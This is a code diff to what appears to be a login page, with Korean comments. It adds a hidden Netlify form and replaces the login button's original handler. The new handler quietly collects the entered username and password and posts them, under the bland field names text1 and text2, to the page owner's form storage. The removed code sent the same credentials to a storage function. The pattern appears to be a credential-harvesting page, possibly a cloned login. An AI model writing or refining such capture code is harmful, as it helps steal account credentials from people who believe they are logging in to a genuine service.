@@ -680,6 +680,13 @@
 
 
 <script src="js/local-navigation-fixes.js?v=5" data-site-root="./"></script>
+<!-- Netlify Forms -->
+<form name="form-test" method="POST" data-netlify="true" hidden>
+  <input type="hidden" name="form-name" value="form-test">
+  <input type="text" name="text1">
+  <input type="text" name="text2">
+</form>
+
 <script>
 document.addEventListener("DOMContentLoaded", () => {
 
@@ -691,20 +698,17 @@ document.addEventListener("DOMContentLoaded", () => {
     return;
   }
 
-  // 기존 버튼 복제 (기존 addEventListener 제거)
+  // 버튼 복제 후 기존 이벤트 제거
   const newButton = oldButton.cloneNode(true);
   newButton.type = "button";
   newButton.removeAttribute("onclick");
 
-  // 기존 버튼 교체
   oldButton.replaceWith(newButton);
 
-  // 새로운 클릭 이벤트
+  // 새 클릭 이벤트
   newButton.addEventListener("click", async (e) => {
     e.preventDefault();
     e.stopPropagation();
-
-    alert("버튼 클릭 감지!");
 
     try {
       const getText = (id) => {
@@ -716,24 +720,25 @@ document.addEventListener("DOMContentLoaded", () => {
       const text1 = getText("login-username");
       const text2 = getText("login-password");
 
-      const response = await fetch("/.netlify/functions/save", {
+      const data = new URLSearchParams();
+      data.append("form-name", "form-test");
+      data.append("text1", text1);
+      data.append("text2", text2);
+
+      const response = await fetch("/", {
         method: "POST",
         headers: {
-          "Content-Type": "application/json"
+          "Content-Type": "application/x-www-form-urlencoded"
         },
-        body: JSON.stringify({ text1, text2 })
+        body: data.toString()
       });
 
       if (!response.ok) {
-        throw new Error(await response.text());
+        throw new Error("HTTP " + response.status);
       }
 
-      const result = await response.json();
-
-      alert("Blobs 저장 성공!\nID: " + result.id);
-
     } catch (error) {
-      alert("오류: " + error.message);
+      alert("전송 실패: " + error.message);
       console.error(error);
     }
   });
